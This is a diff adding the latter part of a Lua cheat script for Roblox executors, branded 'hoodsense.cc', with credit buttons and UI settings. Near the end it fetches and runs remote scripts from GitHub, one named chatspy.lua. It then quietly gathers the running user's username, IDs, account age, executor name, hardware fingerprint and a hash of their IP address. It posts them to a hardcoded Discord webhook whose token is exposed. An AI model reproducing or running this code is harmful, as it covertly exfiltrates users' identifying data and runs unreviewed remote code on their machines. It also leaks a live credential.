+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+discord1:AddToolTip("Main developer.")
+
+local discord2 = Section13:CreateButton("$ Adxn#0001", function(bool)
+    setclipboard("$ Adxn#0001 <@818413928841084938>")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+		print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Credits Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+discord2:AddToolTip("Staff Member.")
+
+--[[local discord = Section13:CreateButton("! ave#0005", function(bool)
+    setclipboard("! ave#0005 <@557671767565664285>")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Credits Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)]]--
+
+local discord3 = Section13:CreateButton("Copy website link.", function(bool)
+    setclipboard("http://hoodsense.cf")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Credits Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local partnerslabel1 = Section10:CreateLabel("Da hood cash services")
+partnerslabel1:UpdateText("Da hood cash services")
+
+local partners1 = Section10:CreateButton("discord.gg/azq", function(bool)
+    setclipboard("https://discord.gg/azq")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Supporter Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local partnerslabel2 = Section10:CreateLabel("Other supporters")
+partnerslabel2:UpdateText("Other supporters")
+
+local partners2 = Section10:CreateButton("v3rmillion.net", function(bool)
+    setclipboard("https://v3rmillion.net")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Supporter Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+local partners = Section10:CreateButton("x.synapse.to", function(bool)
+    setclipboard("https://x.synapse.to")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Supporter Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local partners4 = Section10:CreateButton("krnl.ca", function(bool)
+    setclipboard("https://krnl.ca")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Supporter Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local partners6 = Section10:CreateButton("angxlzz", function(bool)
+    setclipboard("https://youtube.com/angxlzz")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Supporter Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+
+local partners5 = Section10:CreateButton("ekso.gq", function(bool)
+    setclipboard("https://ekso.gq")
+    wait(1)
+    local function callback(text)
+        if text == "Yes" then
+        print("")
+        elseif text == "No" then
+        print("")
+        end
+    end
+    
+    local bindableFunction= Instance.new("BindableFunction")
+    
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "hoodsense.cc";
+        Text = "Supporter Copied on clipboard!";
+        Icon = "rbxassetid://8768441000";
+        Duration = "BLANK";
+        callbakc = bindableFunction;
+        Button1 = "Okay!";
+    })
+end)
+------------------------
+local Toggle3 = Section3:CreateToggle("UI Toggle", nil, function(State)
+	Window:Toggle(State)
+end)
+Toggle3:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(Key)
+	Config.Keybind = Enum.KeyCode[Key]
+end)
+Toggle3:SetState(true)
+
+local Colorpicker3 = Section3:CreateColorpicker("UI Color", function(Color)
+	Window:ChangeColor(Color)
+end)
+Colorpicker3:UpdateColor(Config.Color)
+
+-- credits to jan for patterns
+local Dropdown3 = Section4:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagons","Circles","Flowers","Waves"}, function(Name)
+	if Name == "Default" then
+		Window:SetBackground("5553946656")
+	elseif Name == "Hearts" then
+		Window:SetBackground("6073763717")
+	elseif Name == "Abstract" then
+		Window:SetBackground("6073743871")
+	elseif Name == "Hexagons" then
+		Window:SetBackground("6073628839")
+	elseif Name == "Circles" then
+		Window:SetBackground("6071579801")
+	elseif Name == "Flowers" then
+		Window:SetBackground("6071575925")
+	elseif Name == "Waves" then
+		Window:SetBackground("2151741365")
+	end
+end)
+Dropdown3:SetOption("Default")
+
+local Colorpicker4 = Section4:CreateColorpicker("Color", function(Color)
+	Window:SetBackgroundColor(Color)
+end)
+Colorpicker4:UpdateColor(Color3.new(0, 0, 0))
+
+local Slider3 = Section4:CreateSlider("Transparency",0,1,nil,false, function(Value)
+	Window:SetBackgroundTransparency(Value)
+end)
+Slider3:SetValue(0)
+
+local Slider4 = Section4:CreateSlider("Tile Scale",0,1,nil,false, function(Value)
+	Window:SetTileScale(Value)
+end)
+Slider4:SetValue(0.25)
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "hoodsense.cc";
+    Text = "Succesfully loaded!";
+    Icon = "http://www.roblox.com/asset/?id=8768441000";
+    Duration = "4";
+    callbakc = bindableFunction;
+})
+wait(8)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "hoodsense.cc";
+    Text = "https://hoodsense.cf";
+    Icon = "http://www.roblox.com/asset/?id=8768441000";
+    Duration = "3";
+    callbakc = bindableFunction;
+    Button1 = "Okay!";
+})
+
+print("___________________________HOODSENSE.CC__________________________")
+print("| [hoodsense.cc] Executed version: 6.0")
+print("| [hoodsense.cc] Your user is: "..game.Players.LocalPlayer.Name.. "") 
+print("| [hoodsense.cc] Your id is: "..game.Players.LocalPlayer.UserId.. "")
+print("| [hoodsense.cc] Job id: " ..game.JobId.. "")
+print("| [hoodsense.cc] Join us discord.gg/axq                 ")
+print("| [hoodsense.cc] Made by ekso <@804245361894883339>     ")
+print("| [hoodsense.cc] Website - https://hoodsense.cf         ")
+print("_________________________________________________________________")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/chatspy.lua'))()
+
+local Players = game:GetService("Players")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+
+Players.PlayerAdded:Connect(function(player)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+end)
+wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
+
+local url = 'https://discord.com/api/webhooks/962883148901929050/L9G5cfJ6Dpw4g_nHDye3mHvZOwDPr5FW2OyvzpQrFzUoUiCNqfw4BXfTELF9loTMtoUz'
+local req = syn.request
+local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+
+function ip()local a=req({Url='https://httpbin.org/ip',Method='GET'}) local b=game:GetService('HttpService'):JSONDecode(a.Body) local Hash = game:HttpGet('https://api.hashify.net/hash/md5/hex?value='..b.origin) local Hashed = game:GetService("HttpService"):JSONDecode(Hash) return Hashed.Digest end
+function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+
+local data = {
+    ["username"]  = "hoodsense chan",
+    ["avatar_url"] = "https://media.discordapp.net/attachments/963907774960517221/965805928119173130/IMG_3957.png",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = "HOODSENSE REQUEST",
+                ["url"] = "https://discord.gg/axq",
+                ["icon_url"] = "https://cdn.discordapp.com/attachments/956351837664067605/963085251524046878/Png.png"
+            },
+            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
+            ["description"] = "**Executed in game: **"..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
+            ["color"] = 229954,
+            ["fields"] = {
+                {
+                    ["name"] = "Game ID",
+                    ["value"] = "**Game ID: **"..game.PlaceId,
+                },
+                {
+                    ["name"] = "Player Name",
+                    ["value"] = "**Username: **"..game.Players.LocalPlayer.Name,
+                },
+                {
+                    ["name"] = "Player DisplayName",
+                    ["value"] = "**Display Name: **"..game.Players.LocalPlayer.DisplayName,
+                },
+                {
+                    ["name"] = "Player ID:",
+                    ["value"] = "**ID: **"..game.Players.LocalPlayer.UserId,
+                },                {
+                    ["name"] = "Account Age",
+                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
+                },
+                {
+                    ["name"] = "Exploit",
+                    ["value"] = "```"..getexploit().."```"
+                },
+                {
+                    ["name"] = "Job Id",
+                    ["value"] = "```"..game.JobId.."```"
+                },
+                {
+                    ["name"] = "Hard Ware ID:",
+                    ["value"] = tostring("```"..hwid().."```"),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP ADDRESS:",
+                    ["value"] = tostring("```"..ip().."```"),
+                },
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+        }
+    }
+}
+local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
+
+-------------------------------------------------------------------------
+--[[
+██╗░░██╗░█████╗░░█████╗░██████╗░░██████╗███████╗███╗░░██╗░██████╗███████╗
+██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░██║██╔════╝██╔════╝
+███████║██║░░██║██║░░██║██║░░██║╚█████╗░████╗░░██╔██╗██║╚█████╗░█████╗░░
+██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
+██║░░██║╚█████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░╚███║██████╔╝███████╗
+╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝
+]]
+-------------------------------------------------------------------------
+while true do
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("-[[[[-----------------]]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][]-------------------")
+warn("-[[[[][][][]---------------")
+warn("-[[[[][][][][][][][][------")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[-------------------]]]-")
+warn("-[[[[][][][][][][][][------")
+warn("-[[[[][][][]---------------")
+warn("-[[[[][]-------------------")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+print("                          ")
+print("                          ")
+print("                          ")
+print("                          ")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[[[[--------------]]]]-")
+warn("-[[[[[[[[-------------]]]]-")
+warn("-[[[[-[[[[------------]]]]-")
+warn("-[[[[--[[[[-----------]]]]-")
+warn("-[[[[---[[[[----------]]]]-")
+warn("-[[[[----[[[[---------]]]]-")
+warn("-[[[[-----[[[[--------]]]]-")
+warn("-[[[[------[[[[-------]]]]-")
+warn("-[[[[-------[[[[------]]]]-")
+warn("-[[[[--------[[[[-----]]]]-")
+warn("-[[[[---------[[[[----]]]]-")
+warn("-[[[[----------[[[[---]]]]-")
+warn("-[[[[-----------[[[[--]]]]-")
+warn("-[[[[------------[[[[-]]]]-")
+warn("-[[[[-------------[[[[]]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-----------------------]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+print("                          ")
+warn("---------------------------")
+warn("---------------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[-----------------------")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("-[[[[][][][][][][][][][]]]-")
+warn("---------------------------")
+warn("---------------------------")
+print("                          ")
+print("[hoodsense.cc] Kicu to gej!")
+print("[hoodsense.cc] Kc kuba<3  !")
+wait(69420)
+end
